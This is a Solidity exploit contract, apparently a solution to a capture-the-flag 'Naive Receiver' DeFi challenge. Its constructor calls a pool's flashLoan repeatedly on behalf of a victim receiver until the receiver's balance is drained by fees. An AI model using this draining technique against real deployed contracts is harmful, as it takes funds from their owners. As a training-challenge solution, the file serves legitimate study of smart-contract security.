pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";


interface IPoolFunc {
	function flashLoan(address borrower, uint256 borrowAmount) external;
}


contract NaiveReceiverSingleTransactionExploit {
    using Address for address payable;

    address payable private pool;
	address payable private receiver;
	
   constructor(address payable poolAddress, address payable receiverAddress) {
        pool = poolAddress;
		receiver = receiverAddress;
	    uint256 borrowAmount = 1;
		uint256 fee = 1;
		
		uint8 counter = 0;
		uint8 max_iterations = 13;
		
		while(receiver.balance >= fee) {
			IPoolFunc(pool).flashLoan(receiver, 1);
			counter += 1;
			if (counter > max_iterations){
				break;
			}
		}	
		
    }
	
 
}
